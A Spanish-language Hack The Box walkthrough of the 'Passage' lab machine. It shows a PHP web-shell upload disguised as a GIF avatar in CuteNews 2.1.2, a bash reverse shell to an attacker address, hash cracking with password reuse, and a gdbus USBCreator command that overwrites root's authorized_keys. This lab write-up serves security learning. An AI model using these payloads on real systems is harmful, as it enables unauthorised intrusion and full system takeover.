---
layout: single
title: Passage - Hack The Box
excerpt: "Para resolver ésta máquina nos aprovechamos qué la versión 2.1.2 del CuteNews es vulnerable a un RCE mediante una subida de archivo malicioso PHP, logrando así una Reverse Shell, para posterior a ello crackear un Hash encontrado en el código fuente, logrando así reusar la contraseña para un usuario válido del sistema, ya siendo éste usuario nos aprovechamos que tiene autorización SSH para conctarse como otro usuario del sistema, y ya como éste último usuario explotamos la vulnerabilidad del USB-Creator qué permite sobre-escribir cualquier archivo incluso sin tener permisos, para sobre-escribir la authorized_keys de Root, logrando así acceso sin proporcionar credenciales."
date: 2023-12-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-passage/passage_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - CuteNews Exploitation > RCE
  - hash cracking
  - password reuse
  - USBCreator D-Bus Privilege Escalation
  - abuse USBCreator to overwritten authorized_keys
---
![](/assets/images/htb-writeup-passage/passage_logo.png)

Para resolver ésta máquina nos aprovechamos qué la versión 2.1.2 del CuteNews es vulnerable a un RCE mediante una subida de archivo malicioso PHP, logrando así una Reverse Shell, para posterior a ello crackear un Hash encontrado en el código fuente, logrando así reusar la contraseña para un usuario válido del sistema, ya siendo éste usuario nos aprovechamos que tiene autorización SSH para conctarse como otro usuario del sistema, y ya como éste último usuario explotamos la vulnerabilidad del USB-Creator qué permite sobre-escribir cualquier archivo incluso sin tener permisos, para sobre-escribir la authorized_keys de Root, logrando acceso sin proporcionar credenciales.

# PortScan
____

```
 # Nmap 7.93 scan initiated Fri Dec  1 10:05:34 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.10.206
 Nmap scan report for 10.10.10.206
 Host is up (0.056s latency).
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 17eb9e23ea23b6b1bcc64fdb98d3d4a1 (RSA)
 |   256 71645150c37f184703983e5eb81019fc (ECDSA)
 |_  256 fd562af8d060a7f1a0a147a438d6a8a1 (ED25519)
 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
 |_http-title: Passage News
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Dec  1 10:05:43 2023 -- 1 IP address (1 host up) scanned in 8.94 seconds
```


# WebSite
____
![](/assets/images/htb-writeup-passage/Pasted image 20231201114320.png)

Parece un sitio de noticias, así que opto por ver el código fuente, notando qué está corriendo un "**CuteNews**", que indagando un poco en internet es un gestor de noticias.
![](/assets/images/htb-writeup-passage/Pasted image 20231201114800.png)


Pruebo ir a esa redirección, pero sin sin ir al recurso "**rss.php**", descubriendo así el panel de autenticación.

![](/assets/images/htb-writeup-passage/Pasted image 20231201114925.png)

Logrando así ver la versión del "**CuteNews**", así que sabiendo la versión se me ocurre buscar posibilidades en internet...

Encontrándome así que esta versión es vulnerable a un **RCE** mediante la subida de un archivo malicioso **PHP** al avatar, usando los primeros **magick numbers** de un **GIF** para saltar la "**medida de seguridad**" de que se suban archivos maliciosos.

**PoC** de un script en python para hacerlo automatizado tan sólo indicando la URL [CuteNews 2.1.2 Remote Code Execution](https://packetstormsecurity.com/files/159134/CuteNews-2.1.2-Remote-Code-Execution.html)


En éste caso, estaré haciéndolo manual ya qué conozco como el script funciona & hace esta subida de archivo malicioso...

1. Creamos el archivo malicioso con extensión **.php** que subiremos como "avatar":
```php
GIF8;
<?php system($_GET['cmd']); ?>
```


2. Nos registramos en el "**CuteNews**", para irnos a la "**opciones personales**".

![](/assets/images/htb-writeup-passage/Pasted image 20231201115631.png)

3. Posterior a ello subimos en el avatar el archivo malicioso **php**, logrando evaditar la "medida de seguridad" para no subir código php.

4. Vamos al directorio de subidas de archivos, logrando ver el avatar que hemos subido.
![](/assets/images/htb-writeup-passage/Pasted image 20231201115917.png)

![](/assets/images/htb-writeup-passage/Pasted image 20231201115957.png)

Logrando así como vemos arriba llevar a cabo el **RCE** exitosamente,  así que procedo a entablarme una **Reverse Shell**.


1. Nos ponemos en escucha con **Netcat**.
```bash
nc -nlvp PORT
```

2. Nos mandamos la **Reverse Shell** desde la máquina por la URL.
```bash
bash -c 'bash -i >%26/dev/tcp/10.10.x.x/PORT 0>%261'
```

![](/assets/images/htb-writeup-passage/Pasted image 20231201120446.png)

Ya tan sólo quedaría darle Tratamiento TTY, sino sabes como [((LEE ESTE POST))](https://4uli.github.io/tratamiento-tty/)


# Escalada de Privilegios #1 
___

Lo primero qué hago, es ver cuales son los usuarios con directorios personales.
```bash
ls -la /home/
```
![](/assets/images/htb-writeup-passage/Pasted image 20231201120824.png)

Descubriendo qué existen dos usuarios con directorios, "**nadav**" & "**paul**", y a los cuales nisiquiera podemos entrar a sus directorios, así que empiezo buscando en el código fuente del servicio web **CuteNews**.

Descubriendo así en el directorio "/**cdata**" un subdirectorio interesante con nombre "**/users**", el cual contiene información de los usuarios en **base64**.
hallando allí un recurso llamado "lines", el cual contiene multiples cadenas en base64 aparentemente con información de todos los usuarios...
![](/assets/images/htb-writeup-passage/Pasted image 20231201121158.png)

Al ser varias cadenas, hago una iteración rápida para desconvertir de base64 cada linea del archivo "**lines**".
```bash
cat lines | grep -v php | while read line; do echo $line | base64 -d;echo; done
```

Logrando así ver información de los usuarios en texto claro.
![](/assets/images/htb-writeup-passage/Pasted image 20231201121424.png)

Excepto la contraseña, lo qué aparentemente está **hasheada**, en éste caso me interesaría **crackear** la qué es del usuario **Paul**, a ver sí se está reusando esa contraseña del "**CuteNews**" en el usuario válido del sistema.

copio el **hash**, y utilizo el recurso web para crackear [hashes.com](https://hashes.com/en/decrypt/hash), logrando así crackear la contraseña.
![](/assets/images/htb-writeup-passage/Pasted image 20231201121647.png)

y pruebo a reutilizarla como "**paul**"
![](/assets/images/htb-writeup-passage/Pasted image 20231201121712.png)

Ha funcionado, y hemos ingresado como Paul.

# Escalada de Privilegios #2 
___

Indagando en el directorio personal de "**paul**", descubrí que en el directorio **SSH** tiene como claves autorizadas la de **nadav** así que podríamos ingresar a éste usuario sin proporcionar contraseña.

![](/assets/images/htb-writeup-passage/Pasted image 20231201121842.png)

# Escalada de Privilegios #3 
___

Siendo "**nadav**", entro a su directorio personal, descubriendo qué está un "**.viminfo**" y procedo a ver qué contiene.
![](/assets/images/htb-writeup-passage/Pasted image 20231201122046.png)

Como vemos en el historial de **vim**  existe un **USBCreator** en la máquina.

Indago en internet en busca de posibles vulnerabilidades para escalar privilegios con ésto, encontrando así la vulnerabilidad **CVE-2015-3643**, la cual de forma resumida consiste en qué podemos **sobre-escribir** cualquier archivo existente aunque no tengamos permisos, así que se me ocurre sobre-escribir el "**authorized_keys**" de **Root** para ganar acceso mediante **SSH** sin proporcionar credenciales.

1. Creamos una copia de la clave pública de "**nadav**" en el directorio de la misma.
```bash
cp authorized_keys ~/authorized_keys
```

2. Sobre-escribimos la clave autorizada de Root, para poder acceder como "nadav" sin proporcionar credenciales.
```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/authorized_keys root/.ssh/authorized_keys true
```

![](/assets/images/htb-writeup-passage/Pasted image 20231201124305.png)

Logrando así ganar acceso como Root.
